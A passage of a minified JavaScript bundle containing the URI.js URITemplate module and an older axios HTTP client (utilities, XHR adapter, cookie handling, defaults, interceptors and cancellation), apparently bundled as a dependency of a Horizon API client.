 * Version: 1.19.11
 *
 * Author: Rodney Rehm
 * Web: http://medialize.github.io/URI.js/
 *
 * Licensed under
 *   MIT License http://www.opensource.org/licenses/mit-license
 *
 */
var URITemplate = URITemplate$1.exports, hasRequiredURITemplate;
function requireURITemplate() {
    return hasRequiredURITemplate || (hasRequiredURITemplate = 1,
    function(_) {
        (function(M, j) {
            _.exports ? _.exports = j(requireURI()) : M.URITemplate = j(M.URI, M)
        }
        )(URITemplate, function(M, j) {
            var O = j && j.URITemplate
              , x = Object.prototype.hasOwnProperty;
            function w(F) {
                return w._cache[F] ? w._cache[F] : this instanceof w ? (this.expression = F,
                w._cache[F] = this,
                this) : new w(F)
            }
            function b(F) {
                this.data = F,
                this.cache = {}
            }
            var X = w.prototype
              , Y = {
                "": {
                    prefix: "",
                    separator: ",",
                    named: !1,
                    empty_name_separator: !1,
                    encode: "encode"
                },
                "+": {
                    prefix: "",
                    separator: ",",
                    named: !1,
                    empty_name_separator: !1,
                    encode: "encodeReserved"
                },
                "#": {
                    prefix: "#",
                    separator: ",",
                    named: !1,
                    empty_name_separator: !1,
                    encode: "encodeReserved"
                },
                ".": {
                    prefix: ".",
                    separator: ".",
                    named: !1,
                    empty_name_separator: !1,
                    encode: "encode"
                },
                "/": {
                    prefix: "/",
                    separator: "/",
                    named: !1,
                    empty_name_separator: !1,
                    encode: "encode"
                },
                ";": {
                    prefix: ";",
                    separator: ";",
                    named: !0,
                    empty_name_separator: !1,
                    encode: "encode"
                },
                "?": {
                    prefix: "?",
                    separator: "&",
                    named: !0,
                    empty_name_separator: !0,
                    encode: "encode"
                },
                "&": {
                    prefix: "&",
                    separator: "&",
                    named: !0,
                    empty_name_separator: !0,
                    encode: "encode"
                }
            };
            return w._cache = {},
            w.EXPRESSION_PATTERN = /\{([^a-zA-Z0-9%_]?)([^\}]+)(\}|$)/g,
            w.VARIABLE_PATTERN = /^([^*:.](?:\.?[^*:.])*)((\*)|:(\d+))?$/,
            w.VARIABLE_NAME_PATTERN = /[^a-zA-Z0-9%_.]/,
            w.LITERAL_PATTERN = /[<>{}"`^| \\]/,
            w.expand = function(F, V, K) {
                var Q = Y[F.operator], ee = Q.named ? "Named" : "Unnamed", ae = F.variables, ne = [], oe, ue, fe;
                for (fe = 0; ue = ae[fe]; fe++) {
                    if (oe = V.get(ue.name),
                    oe.type === 0 && K && K.strict)
                        throw new Error('Missing expansion value for variable "' + ue.name + '"');
                    if (!oe.val.length) {
                        oe.type && ne.push("");
                        continue
                    }
                    if (oe.type > 1 && ue.maxlength)
                        throw new Error('Invalid expression: Prefix modifier not applicable to variable "' + ue.name + '"');
                    ne.push(w["expand" + ee](oe, Q, ue.explode, ue.explode && Q.separator || ",", ue.maxlength, ue.name))
                }
                return ne.length ? Q.prefix + ne.join(Q.separator) : ""
            }
            ,
            w.expandNamed = function(F, V, K, Q, ee, ae) {
                var ne = "", oe = V.encode, ue = V.empty_name_separator, fe = !F[oe].length, he = F.type === 2 ? "" : M[oe](ae), pe, ye, be;
                for (ye = 0,
                be = F.val.length; ye < be; ye++)
                    ee ? (pe = M[oe](F.val[ye][1].substring(0, ee)),
                    F.type === 2 && (he = M[oe](F.val[ye][0].substring(0, ee)))) : fe ? (pe = M[oe](F.val[ye][1]),
                    F.type === 2 ? (he = M[oe](F.val[ye][0]),
                    F[oe].push([he, pe])) : F[oe].push([void 0, pe])) : (pe = F[oe][ye][1],
                    F.type === 2 && (he = F[oe][ye][0])),
                    ne && (ne += Q),
                    K ? ne += he + (ue || pe ? "=" : "") + pe : (ye || (ne += M[oe](ae) + (ue || pe ? "=" : "")),
                    F.type === 2 && (ne += he + ","),
                    ne += pe);
                return ne
            }
            ,
            w.expandUnnamed = function(F, V, K, Q, ee) {
                var ae = "", ne = V.encode, oe = V.empty_name_separator, ue = !F[ne].length, fe, he, pe, ye;
                for (pe = 0,
                ye = F.val.length; pe < ye; pe++)
                    ee ? he = M[ne](F.val[pe][1].substring(0, ee)) : ue ? (he = M[ne](F.val[pe][1]),
                    F[ne].push([F.type === 2 ? M[ne](F.val[pe][0]) : void 0, he])) : he = F[ne][pe][1],
                    ae && (ae += Q),
                    F.type === 2 && (ee ? fe = M[ne](F.val[pe][0].substring(0, ee)) : fe = F[ne][pe][0],
                    ae += fe,
                    K ? ae += oe || he ? "=" : "" : ae += ","),
                    ae += he;
                return ae
            }
            ,
            w.noConflict = function() {
                return j.URITemplate === w && (j.URITemplate = O),
                w
            }
            ,
            X.expand = function(F, V) {
                var K = "";
                (!this.parts || !this.parts.length) && this.parse(),
                F instanceof b || (F = new b(F));
                for (var Q = 0, ee = this.parts.length; Q < ee; Q++)
                    K += typeof this.parts[Q] == "string" ? this.parts[Q] : w.expand(this.parts[Q], F, V);
                return K
            }
            ,
            X.parse = function() {
                var F = this.expression, V = w.EXPRESSION_PATTERN, K = w.VARIABLE_PATTERN, Q = w.VARIABLE_NAME_PATTERN, ee = w.LITERAL_PATTERN, ae = [], ne = 0, oe, ue, fe, he = function(be) {
                    if (be.match(ee))
                        throw new Error('Invalid Literal "' + be + '"');
                    return be
                };
                for (V.lastIndex = 0; ; ) {
                    if (ue = V.exec(F),
                    ue === null) {
                        ae.push(he(F.substring(ne)));
                        break
                    } else
                        ae.push(he(F.substring(ne, ue.index))),
                        ne = ue.index + ue[0].length;
                    if (Y[ue[1]]) {
                        if (!ue[3])
                            throw new Error('Unclosed Expression "' + ue[0] + '"')
                    } else
                        throw new Error('Unknown Operator "' + ue[1] + '" in "' + ue[0] + '"');
                    oe = ue[2].split(",");
                    for (var pe = 0, ye = oe.length; pe < ye; pe++) {
                        if (fe = oe[pe].match(K),
                        fe === null)
                            throw new Error('Invalid Variable "' + oe[pe] + '" in "' + ue[0] + '"');
                        if (fe[1].match(Q))
                            throw new Error('Invalid Variable Name "' + fe[1] + '" in "' + ue[0] + '"');
                        oe[pe] = {
                            name: fe[1],
                            explode: !!fe[3],
                            maxlength: fe[4] && parseInt(fe[4], 10)
                        }
                    }
                    if (!oe.length)
                        throw new Error('Expression Missing Variable(s) "' + ue[0] + '"');
                    ae.push({
                        expression: ue[0],
                        operator: ue[1],
                        variables: oe
                    })
                }
                return ae.length || ae.push(he(F)),
                this.parts = ae,
                this
            }
            ,
            b.prototype.get = function(F) {
                var V = this.data, K = {
                    type: 0,
                    val: [],
                    encode: [],
                    encodeReserved: []
                }, Q, ee, ae;
                if (this.cache[F] !== void 0)
                    return this.cache[F];
                if (this.cache[F] = K,
                String(Object.prototype.toString.call(V)) === "[object Function]" ? ae = V(F) : String(Object.prototype.toString.call(V[F])) === "[object Function]" ? ae = V[F](F) : ae = V[F],
                ae == null)
                    return K;
                if (String(Object.prototype.toString.call(ae)) === "[object Array]") {
                    for (Q = 0,
                    ee = ae.length; Q < ee; Q++)
                        ae[Q] !== void 0 && ae[Q] !== null && K.val.push([void 0, String(ae[Q])]);
                    K.val.length && (K.type = 3)
                } else if (String(Object.prototype.toString.call(ae)) === "[object Object]") {
                    for (Q in ae)
                        x.call(ae, Q) && ae[Q] !== void 0 && ae[Q] !== null && K.val.push([Q, String(ae[Q])]);
                    K.val.length && (K.type = 2)
                } else
                    K.type = 1,
                    K.val.push([void 0, String(ae)]);
                return K
            }
            ,
            M.expand = function(F, V) {
                var K = new w(F)
                  , Q = K.expand(V);
                return new M(Q)
            }
            ,
            w
        })
    }(URITemplate$1)),
    URITemplate$1.exports
}
var horizon_axios_client = {}, axios$2 = {
    exports: {}
}, bind$1, hasRequiredBind;
function requireBind() {
    return hasRequiredBind || (hasRequiredBind = 1,
    bind$1 = function(M, j) {
        return function() {
            for (var x = new Array(arguments.length), w = 0; w < x.length; w++)
                x[w] = arguments[w];
            return M.apply(j, x)
        }
    }
    ),
    bind$1
}
var utils$4, hasRequiredUtils$2;
function requireUtils$2() {
    if (hasRequiredUtils$2)
        return utils$4;
    hasRequiredUtils$2 = 1;
    var _ = requireBind()
      , M = Object.prototype.toString;
    function j(Ae) {
        return M.call(Ae) === "[object Array]"
    }
    function O(Ae) {
        return typeof Ae > "u"
    }
    function x(Ae) {
        return Ae !== null && !O(Ae) && Ae.constructor !== null && !O(Ae.constructor) && typeof Ae.constructor.isBuffer == "function" && Ae.constructor.isBuffer(Ae)
    }
    function w(Ae) {
        return M.call(Ae) === "[object ArrayBuffer]"
    }
    function b(Ae) {
        return typeof FormData < "u" && Ae instanceof FormData
    }
    function X(Ae) {
        var Ee;
        return typeof ArrayBuffer < "u" && ArrayBuffer.isView ? Ee = ArrayBuffer.isView(Ae) : Ee = Ae && Ae.buffer && Ae.buffer instanceof ArrayBuffer,
        Ee
    }
    function Y(Ae) {
        return typeof Ae == "string"
    }
    function F(Ae) {
        return typeof Ae == "number"
    }
    function V(Ae) {
        return Ae !== null && typeof Ae == "object"
    }
    function K(Ae) {
        if (M.call(Ae) !== "[object Object]")
            return !1;
        var Ee = Object.getPrototypeOf(Ae);
        return Ee === null || Ee === Object.prototype
    }
    function Q(Ae) {
        return M.call(Ae) === "[object Date]"
    }
    function ee(Ae) {
        return M.call(Ae) === "[object File]"
    }
    function ae(Ae) {
        return M.call(Ae) === "[object Blob]"
    }
    function ne(Ae) {
        return M.call(Ae) === "[object Function]"
    }
    function oe(Ae) {
        return V(Ae) && ne(Ae.pipe)
    }
    function ue(Ae) {
        return typeof URLSearchParams < "u" && Ae instanceof URLSearchParams
    }
    function fe(Ae) {
        return Ae.replace(/^\s*/, "").replace(/\s*$/, "")
    }
    function he() {
        return typeof navigator < "u" && (navigator.product === "ReactNative" || navigator.product === "NativeScript" || navigator.product === "NS") ? !1 : typeof window < "u" && typeof document < "u"
    }
    function pe(Ae, Ee) {
        if (!(Ae === null || typeof Ae > "u"))
            if (typeof Ae != "object" && (Ae = [Ae]),
            j(Ae))
                for (var Be = 0, ce = Ae.length; Be < ce; Be++)
                    Ee.call(null, Ae[Be], Be, Ae);
            else
                for (var q in Ae)
                    Object.prototype.hasOwnProperty.call(Ae, q) && Ee.call(null, Ae[q], q, Ae)
    }
    function ye() {
        var Ae = {};
        function Ee(q, L) {
            K(Ae[L]) && K(q) ? Ae[L] = ye(Ae[L], q) : K(q) ? Ae[L] = ye({}, q) : j(q) ? Ae[L] = q.slice() : Ae[L] = q
        }
        for (var Be = 0, ce = arguments.length; Be < ce; Be++)
            pe(arguments[Be], Ee);
        return Ae
    }
    function be(Ae, Ee, Be) {
        return pe(Ee, function(q, L) {
            Be && typeof q == "function" ? Ae[L] = _(q, Be) : Ae[L] = q
        }),
        Ae
    }
    function xe(Ae) {
        return Ae.charCodeAt(0) === 65279 && (Ae = Ae.slice(1)),
        Ae
    }
    return utils$4 = {
        isArray: j,
        isArrayBuffer: w,
        isBuffer: x,
        isFormData: b,
        isArrayBufferView: X,
        isString: Y,
        isNumber: F,
        isObject: V,
        isPlainObject: K,
        isUndefined: O,
        isDate: Q,
        isFile: ee,
        isBlob: ae,
        isFunction: ne,
        isStream: oe,
        isURLSearchParams: ue,
        isStandardBrowserEnv: he,
        forEach: pe,
        merge: ye,
        extend: be,
        trim: fe,
        stripBOM: xe
    },
    utils$4
}
var buildURL$1, hasRequiredBuildURL;
function requireBuildURL() {
    if (hasRequiredBuildURL)
        return buildURL$1;
    hasRequiredBuildURL = 1;
    var _ = requireUtils$2();
    function M(j) {
        return encodeURIComponent(j).replace(/%3A/gi, ":").replace(/%24/g, "$").replace(/%2C/gi, ",").replace(/%20/g, "+").replace(/%5B/gi, "[").replace(/%5D/gi, "]")
    }
    return buildURL$1 = function(O, x, w) {
        if (!x)
            return O;
        var b;
        if (w)
            b = w(x);
        else if (_.isURLSearchParams(x))
            b = x.toString();
        else {
            var X = [];
            _.forEach(x, function(V, K) {
                V === null || typeof V > "u" || (_.isArray(V) ? K = K + "[]" : V = [V],
                _.forEach(V, function(ee) {
                    _.isDate(ee) ? ee = ee.toISOString() : _.isObject(ee) && (ee = JSON.stringify(ee)),
                    X.push(M(K) + "=" + M(ee))
                }))
            }),
            b = X.join("&")
        }
        if (b) {
            var Y = O.indexOf("#");
            Y !== -1 && (O = O.slice(0, Y)),
            O += (O.indexOf("?") === -1 ? "?" : "&") + b
        }
        return O
    }
    ,
    buildURL$1
}
var InterceptorManager_1, hasRequiredInterceptorManager;
function requireInterceptorManager() {
    if (hasRequiredInterceptorManager)
        return InterceptorManager_1;
    hasRequiredInterceptorManager = 1;
    var _ = requireUtils$2();
    function M() {
        this.handlers = []
    }
    return M.prototype.use = function(O, x) {
        return this.handlers.push({
            fulfilled: O,
            rejected: x
        }),
        this.handlers.length - 1
    }
    ,
    M.prototype.eject = function(O) {
        this.handlers[O] && (this.handlers[O] = null)
    }
    ,
    M.prototype.forEach = function(O) {
        _.forEach(this.handlers, function(w) {
            w !== null && O(w)
        })
    }
    ,
    InterceptorManager_1 = M,
    InterceptorManager_1
}
var transformData$1, hasRequiredTransformData;
function requireTransformData() {
    if (hasRequiredTransformData)
        return transformData$1;
    hasRequiredTransformData = 1;
    var _ = requireUtils$2();
    return transformData$1 = function(j, O, x) {
        return _.forEach(x, function(b) {
            j = b(j, O)
        }),
        j
    }
    ,
    transformData$1
}
var isCancel$2, hasRequiredIsCancel;
function requireIsCancel() {
    return hasRequiredIsCancel || (hasRequiredIsCancel = 1,
    isCancel$2 = function(M) {
        return !!(M && M.__CANCEL__)
    }
    ),
    isCancel$2
}
var normalizeHeaderName, hasRequiredNormalizeHeaderName;
function requireNormalizeHeaderName() {
    if (hasRequiredNormalizeHeaderName)
        return normalizeHeaderName;
    hasRequiredNormalizeHeaderName = 1;
    var _ = requireUtils$2();
    return normalizeHeaderName = function(j, O) {
        _.forEach(j, function(w, b) {
            b !== O && b.toUpperCase() === O.toUpperCase() && (j[O] = w,
            delete j[b])
        })
    }
    ,
    normalizeHeaderName
}
var enhanceError, hasRequiredEnhanceError;
function requireEnhanceError() {
    return hasRequiredEnhanceError || (hasRequiredEnhanceError = 1,
    enhanceError = function(M, j, O, x, w) {
        return M.config = j,
        O && (M.code = O),
        M.request = x,
        M.response = w,
        M.isAxiosError = !0,
        M.toJSON = function() {
            return {
                message: this.message,
                name: this.name,
                description: this.description,
                number: this.number,
                fileName: this.fileName,
                lineNumber: this.lineNumber,
                columnNumber: this.columnNumber,
                stack: this.stack,
                config: this.config,
                code: this.code
            }
        }
        ,
        M
    }
    ),
    enhanceError
}
var createError, hasRequiredCreateError;
function requireCreateError() {
    if (hasRequiredCreateError)
        return createError;
    hasRequiredCreateError = 1;
    var _ = requireEnhanceError();
    return createError = function(j, O, x, w, b) {
        var X = new Error(j);
        return _(X, O, x, w, b)
    }
    ,
    createError
}
var settle$1, hasRequiredSettle;
function requireSettle() {
    if (hasRequiredSettle)
        return settle$1;
    hasRequiredSettle = 1;
    var _ = requireCreateError();
    return settle$1 = function(j, O, x) {
        var w = x.config.validateStatus;
        !x.status || !w || w(x.status) ? j(x) : O(_("Request failed with status code " + x.status, x.config, null, x.request, x))
    }
    ,
    settle$1
}
var cookies$1, hasRequiredCookies;
function requireCookies() {
    if (hasRequiredCookies)
        return cookies$1;
    hasRequiredCookies = 1;
    var _ = requireUtils$2();
    return cookies$1 = _.isStandardBrowserEnv() ? function() {
        return {
            write: function(O, x, w, b, X, Y) {
                var F = [];
                F.push(O + "=" + encodeURIComponent(x)),
                _.isNumber(w) && F.push("expires=" + new Date(w).toGMTString()),
                _.isString(b) && F.push("path=" + b),
                _.isString(X) && F.push("domain=" + X),
                Y === !0 && F.push("secure"),
                document.cookie = F.join("; ")
            },
            read: function(O) {
                var x = document.cookie.match(new RegExp("(^|;\\s*)(" + O + ")=([^;]*)"));
                return x ? decodeURIComponent(x[3]) : null
            },
            remove: function(O) {
                this.write(O, "", Date.now() - 864e5)
            }
        }
    }() : function() {
        return {
            write: function() {},
            read: function() {
                return null
            },
            remove: function() {}
        }
    }(),
    cookies$1
}
var isAbsoluteURL$1, hasRequiredIsAbsoluteURL;
function requireIsAbsoluteURL() {
    return hasRequiredIsAbsoluteURL || (hasRequiredIsAbsoluteURL = 1,
    isAbsoluteURL$1 = function(M) {
        return /^([a-z][a-z\d\+\-\.]*:)?\/\//i.test(M)
    }
    ),
    isAbsoluteURL$1
}
var combineURLs$1, hasRequiredCombineURLs;
function requireCombineURLs() {
    return hasRequiredCombineURLs || (hasRequiredCombineURLs = 1,
    combineURLs$1 = function(M, j) {
        return j ? M.replace(/\/+$/, "") + "/" + j.replace(/^\/+/, "") : M
    }
    ),
    combineURLs$1
}
var buildFullPath$1, hasRequiredBuildFullPath;
function requireBuildFullPath() {
    if (hasRequiredBuildFullPath)
        return buildFullPath$1;
    hasRequiredBuildFullPath = 1;
    var _ = requireIsAbsoluteURL()
      , M = requireCombineURLs();
    return buildFullPath$1 = function(O, x) {
        return O && !_(x) ? M(O, x) : x
    }
    ,
    buildFullPath$1
}
var parseHeaders$1, hasRequiredParseHeaders;
function requireParseHeaders() {
    if (hasRequiredParseHeaders)
        return parseHeaders$1;
    hasRequiredParseHeaders = 1;
    var _ = requireUtils$2()
      , M = ["age", "authorization", "content-length", "content-type", "etag", "expires", "from", "host", "if-modified-since", "if-unmodified-since", "last-modified", "location", "max-forwards", "proxy-authorization", "referer", "retry-after", "user-agent"];
    return parseHeaders$1 = function(O) {
        var x = {}, w, b, X;
        return O && _.forEach(O.split(`
`), function(F) {
            if (X = F.indexOf(":"),
            w = _.trim(F.substr(0, X)).toLowerCase(),
            b = _.trim(F.substr(X + 1)),
            w) {
                if (x[w] && M.indexOf(w) >= 0)
                    return;
                w === "set-cookie" ? x[w] = (x[w] ? x[w] : []).concat([b]) : x[w] = x[w] ? x[w] + ", " + b : b
            }
        }),
        x
    }
    ,
    parseHeaders$1
}
var isURLSameOrigin$1, hasRequiredIsURLSameOrigin;
function requireIsURLSameOrigin() {
    if (hasRequiredIsURLSameOrigin)
        return isURLSameOrigin$1;
    hasRequiredIsURLSameOrigin = 1;
    var _ = requireUtils$2();
    return isURLSameOrigin$1 = _.isStandardBrowserEnv() ? function() {
        var j = /(msie|trident)/i.test(navigator.userAgent), O = document.createElement("a"), x;
        function w(b) {
            var X = b;
            return j && (O.setAttribute("href", X),
            X = O.href),
            O.setAttribute("href", X),
            {
                href: O.href,
                protocol: O.protocol ? O.protocol.replace(/:$/, "") : "",
                host: O.host,
                search: O.search ? O.search.replace(/^\?/, "") : "",
                hash: O.hash ? O.hash.replace(/^#/, "") : "",
                hostname: O.hostname,
                port: O.port,
                pathname: O.pathname.charAt(0) === "/" ? O.pathname : "/" + O.pathname
            }
        }
        return x = w(window.location.href),
        function(X) {
            var Y = _.isString(X) ? w(X) : X;
            return Y.protocol === x.protocol && Y.host === x.host
        }
    }() : function() {
        return function() {
            return !0
        }
    }(),
    isURLSameOrigin$1
}
var xhr, hasRequiredXhr;
function requireXhr() {
    if (hasRequiredXhr)
        return xhr;
    hasRequiredXhr = 1;
    var _ = requireUtils$2()
      , M = requireSettle()
      , j = requireCookies()
      , O = requireBuildURL()
      , x = requireBuildFullPath()
      , w = requireParseHeaders()
      , b = requireIsURLSameOrigin()
      , X = requireCreateError();
    return xhr = function(F) {
        return new Promise(function(K, Q) {
            var ee = F.data
              , ae = F.headers;
            _.isFormData(ee) && delete ae["Content-Type"];
            var ne = new XMLHttpRequest;
            if (F.auth) {
                var oe = F.auth.username || ""
                  , ue = F.auth.password ? unescape(encodeURIComponent(F.auth.password)) : "";
                ae.Authorization = "Basic " + btoa(oe + ":" + ue)
            }
            var fe = x(F.baseURL, F.url);
            if (ne.open(F.method.toUpperCase(), O(fe, F.params, F.paramsSerializer), !0),
            ne.timeout = F.timeout,
            ne.onreadystatechange = function() {
                if (!(!ne || ne.readyState !== 4) && !(ne.status === 0 && !(ne.responseURL && ne.responseURL.indexOf("file:") === 0))) {
                    var ye = "getAllResponseHeaders"in ne ? w(ne.getAllResponseHeaders()) : null
                      , be = !F.responseType || F.responseType === "text" ? ne.responseText : ne.response
                      , xe = {
                        data: be,
                        status: ne.status,
                        statusText: ne.statusText,
                        headers: ye,
                        config: F,
                        request: ne
                    };
                    M(K, Q, xe),
                    ne = null
                }
            }
            ,
            ne.onabort = function() {
                ne && (Q(X("Request aborted", F, "ECONNABORTED", ne)),
                ne = null)
            }
            ,
            ne.onerror = function() {
                Q(X("Network Error", F, null, ne)),
                ne = null
            }
            ,
            ne.ontimeout = function() {
                var ye = "timeout of " + F.timeout + "ms exceeded";
                F.timeoutErrorMessage && (ye = F.timeoutErrorMessage),
                Q(X(ye, F, "ECONNABORTED", ne)),
                ne = null
            }
            ,
            _.isStandardBrowserEnv()) {
                var he = (F.withCredentials || b(fe)) && F.xsrfCookieName ? j.read(F.xsrfCookieName) : void 0;
                he && (ae[F.xsrfHeaderName] = he)
            }
            if ("setRequestHeader"in ne && _.forEach(ae, function(ye, be) {
                typeof ee > "u" && be.toLowerCase() === "content-type" ? delete ae[be] : ne.setRequestHeader(be, ye)
            }),
            _.isUndefined(F.withCredentials) || (ne.withCredentials = !!F.withCredentials),
            F.responseType)
                try {
                    ne.responseType = F.responseType
                } catch (pe) {
                    if (F.responseType !== "json")
                        throw pe
                }
            typeof F.onDownloadProgress == "function" && ne.addEventListener("progress", F.onDownloadProgress),
            typeof F.onUploadProgress == "function" && ne.upload && ne.upload.addEventListener("progress", F.onUploadProgress),
            F.cancelToken && F.cancelToken.promise.then(function(ye) {
                ne && (ne.abort(),
                Q(ye),
                ne = null)
            }),
            ee || (ee = null),
            ne.send(ee)
        }
        )
    }
    ,
    xhr
}
var defaults_1, hasRequiredDefaults;
function requireDefaults() {
    if (hasRequiredDefaults)
        return defaults_1;
    hasRequiredDefaults = 1;
    var _ = requireUtils$2()
      , M = requireNormalizeHeaderName()
      , j = {
        "Content-Type": "application/x-www-form-urlencoded"
    };
    function O(b, X) {
        !_.isUndefined(b) && _.isUndefined(b["Content-Type"]) && (b["Content-Type"] = X)
    }
    function x() {
        var b;
        return (typeof XMLHttpRequest < "u" || typeof process$1 < "u" && Object.prototype.toString.call(process$1) === "[object process]") && (b = requireXhr()),
        b
    }
    var w = {
        adapter: x(),
        transformRequest: [function(X, Y) {
            return M(Y, "Accept"),
            M(Y, "Content-Type"),
            _.isFormData(X) || _.isArrayBuffer(X) || _.isBuffer(X) || _.isStream(X) || _.isFile(X) || _.isBlob(X) ? X : _.isArrayBufferView(X) ? X.buffer : _.isURLSearchParams(X) ? (O(Y, "application/x-www-form-urlencoded;charset=utf-8"),
            X.toString()) : _.isObject(X) ? (O(Y, "application/json;charset=utf-8"),
            JSON.stringify(X)) : X
        }
        ],
        transformResponse: [function(X) {
            if (typeof X == "string")
                try {
                    X = JSON.parse(X)
                } catch {}
            return X
        }
        ],
        timeout: 0,
        xsrfCookieName: "XSRF-TOKEN",
        xsrfHeaderName: "X-XSRF-TOKEN",
        maxContentLength: -1,
        maxBodyLength: -1,
        validateStatus: function(X) {
            return X >= 200 && X < 300
        }
    };
    return w.headers = {
        common: {
            Accept: "application/json, text/plain, */*"
        }
    },
    _.forEach(["delete", "get", "head"], function(X) {
        w.headers[X] = {}
    }),
    _.forEach(["post", "put", "patch"], function(X) {
        w.headers[X] = _.merge(j)
    }),
    defaults_1 = w,
    defaults_1
}
var dispatchRequest$1, hasRequiredDispatchRequest;
function requireDispatchRequest() {
    if (hasRequiredDispatchRequest)
        return dispatchRequest$1;
    hasRequiredDispatchRequest = 1;
    var _ = requireUtils$2()
      , M = requireTransformData()
      , j = requireIsCancel()
      , O = requireDefaults();
    function x(w) {
        w.cancelToken && w.cancelToken.throwIfRequested()
    }
    return dispatchRequest$1 = function(b) {
        x(b),
        b.headers = b.headers || {},
        b.data = M(b.data, b.headers, b.transformRequest),
        b.headers = _.merge(b.headers.common || {}, b.headers[b.method] || {}, b.headers),
        _.forEach(["delete", "get", "head", "post", "put", "patch", "common"], function(F) {
            delete b.headers[F]
        });
        var X = b.adapter || O.adapter;
        return X(b).then(function(F) {
            return x(b),
            F.data = M(F.data, F.headers, b.transformResponse),
            F
        }, function(F) {
            return j(F) || (x(b),
            F && F.response && (F.response.data = M(F.response.data, F.response.headers, b.transformResponse))),
            Promise.reject(F)
        })
    }
    ,
    dispatchRequest$1
}
var mergeConfig$2, hasRequiredMergeConfig;
function requireMergeConfig() {
    if (hasRequiredMergeConfig)
        return mergeConfig$2;
    hasRequiredMergeConfig = 1;
    var _ = requireUtils$2();
    return mergeConfig$2 = function(j, O) {
        O = O || {};
        var x = {}
          , w = ["url", "method", "data"]
          , b = ["headers", "auth", "proxy", "params"]
          , X = ["baseURL", "transformRequest", "transformResponse", "paramsSerializer", "timeout", "timeoutMessage", "withCredentials", "adapter", "responseType", "xsrfCookieName", "xsrfHeaderName", "onUploadProgress", "onDownloadProgress", "decompress", "maxContentLength", "maxBodyLength", "maxRedirects", "transport", "httpAgent", "httpsAgent", "cancelToken", "socketPath", "responseEncoding"]
          , Y = ["validateStatus"];
        function F(ee, ae) {
            return _.isPlainObject(ee) && _.isPlainObject(ae) ? _.merge(ee, ae) : _.isPlainObject(ae) ? _.merge({}, ae) : _.isArray(ae) ? ae.slice() : ae
        }
        function V(ee) {
            _.isUndefined(O[ee]) ? _.isUndefined(j[ee]) || (x[ee] = F(void 0, j[ee])) : x[ee] = F(j[ee], O[ee])
        }
        _.forEach(w, function(ae) {
            _.isUndefined(O[ae]) || (x[ae] = F(void 0, O[ae]))
        }),
        _.forEach(b, V),
        _.forEach(X, function(ae) {
            _.isUndefined(O[ae]) ? _.isUndefined(j[ae]) || (x[ae] = F(void 0, j[ae])) : x[ae] = F(void 0, O[ae])
        }),
        _.forEach(Y, function(ae) {
            ae in O ? x[ae] = F(j[ae], O[ae]) : ae in j && (x[ae] = F(void 0, j[ae]))
        });
        var K = w.concat(b).concat(X).concat(Y)
          , Q = Object.keys(j).concat(Object.keys(O)).filter(function(ae) {
            return K.indexOf(ae) === -1
        });
        return _.forEach(Q, V),
        x
    }
    ,
    mergeConfig$2
}
var Axios_1, hasRequiredAxios$2;
function requireAxios$2() {
    if (hasRequiredAxios$2)
        return Axios_1;
    hasRequiredAxios$2 = 1;
    var _ = requireUtils$2()
      , M = requireBuildURL()
      , j = requireInterceptorManager()
      , O = requireDispatchRequest()
      , x = requireMergeConfig();
    function w(b) {
        this.defaults = b,
        this.interceptors = {
            request: new j,
            response: new j
        }
    }
    return w.prototype.request = function(X) {
        typeof X == "string" ? (X = arguments[1] || {},
        X.url = arguments[0]) : X = X || {},
        X = x(this.defaults, X),
        X.method ? X.method = X.method.toLowerCase() : this.defaults.method ? X.method = this.defaults.method.toLowerCase() : X.method = "get";
        var Y = [O, void 0]
          , F = Promise.resolve(X);
        for (this.interceptors.request.forEach(function(K) {
            Y.unshift(K.fulfilled, K.rejected)
        }),
        this.interceptors.response.forEach(function(K) {
            Y.push(K.fulfilled, K.rejected)
        }); Y.length; )
            F = F.then(Y.shift(), Y.shift());
        return F
    }
    ,
    w.prototype.getUri = function(X) {
        return X = x(this.defaults, X),
        M(X.url, X.params, X.paramsSerializer).replace(/^\?/, "")
    }
    ,
    _.forEach(["delete", "get", "head", "options"], function(X) {
        w.prototype[X] = function(Y, F) {
            return this.request(x(F || {}, {
                method: X,
                url: Y,
                data: (F || {}).data
            }))
        }
    }),
    _.forEach(["post", "put", "patch"], function(X) {
        w.prototype[X] = function(Y, F, V) {
            return this.request(x(V || {}, {
                method: X,
                url: Y,
                data: F
            }))
        }
    }),
    Axios_1 = w,
    Axios_1
}
var Cancel_1, hasRequiredCancel;
function requireCancel() {
    if (hasRequiredCancel)
        return Cancel_1;
    hasRequiredCancel = 1;
    function _(M) {
        this.message = M
    }
    return _.prototype.toString = function() {
        return "Cancel" + (this.message ? ": " + this.message : "")
    }
    ,
    _.prototype.__CANCEL__ = !0,
    Cancel_1 = _,
    Cancel_1
}
var CancelToken_1, hasRequiredCancelToken;
function requireCancelToken() {
    if (hasRequiredCancelToken)
        return CancelToken_1;
    hasRequiredCancelToken = 1;
    var _ = requireCancel();
    function M(j) {
        if (typeof j != "function")
            throw new TypeError("executor must be a function.");
        var O;
        this.promise = new Promise(function(b) {
            O = b
        }
        );
        var x = this;
        j(function(b) {
            x.reason || (x.reason = new _(b),
            O(x.reason))
        })
    }
    return M.prototype.throwIfRequested = function() {
        if (this.reason)
            throw this.reason
    }
    ,
    M.source = function() {
        var O, x = new M(function(b) {
            O = b
        }
        );
        return {
            token: x,
            cancel: O
        }
    }
    ,
    CancelToken_1 = M,
    CancelToken_1
}
var spread$2, hasRequiredSpread;
function requireSpread() {
    return hasRequiredSpread || (hasRequiredSpread = 1,
    spread$2 = function(M) {
        return function(O) {
            return M.apply(null, O)
        }
    }
    ),
    spread$2
}
var isAxiosError$2, hasRequiredIsAxiosError;
function requireIsAxiosError() {
    return hasRequiredIsAxiosError || (hasRequiredIsAxiosError = 1,
    isAxiosError$2 = function(M) {
        return typeof M == "object" && M.isAxiosError === !0
    }
    ),
    isAxiosError$2
}
var hasRequiredAxios$1;
function requireAxios$1() {
    if (hasRequiredAxios$1)
        return axios$2.exports;
    hasRequiredAxios$1 = 1;
    var _ = requireUtils$2()
      , M = requireBind()
      , j = requireAxios$2()
      , O = requireMergeConfig()
      , x = requireDefaults();
    function w(X) {
        var Y = new j(X)
          , F = M(j.prototype.request, Y);
        return _.extend(F, j.prototype, Y),
        _.extend(F, Y),
        F
    }
    var b = w(x);
    return b.Axios = j,
    b.create = function(Y) {
        return w(O(b.defaults, Y))
    }
    ,
    b.Cancel = requireCancel(),
    b.CancelToken = requireCancelToken(),
    b.isCancel = requireIsCancel(),
    b.all = function(Y) {
        return Promise.all(Y)
    }
    ,
    b.spread = requireSpread(),
    b.isAxiosError = requireIsAxiosError(),
    axios$2.exports = b,
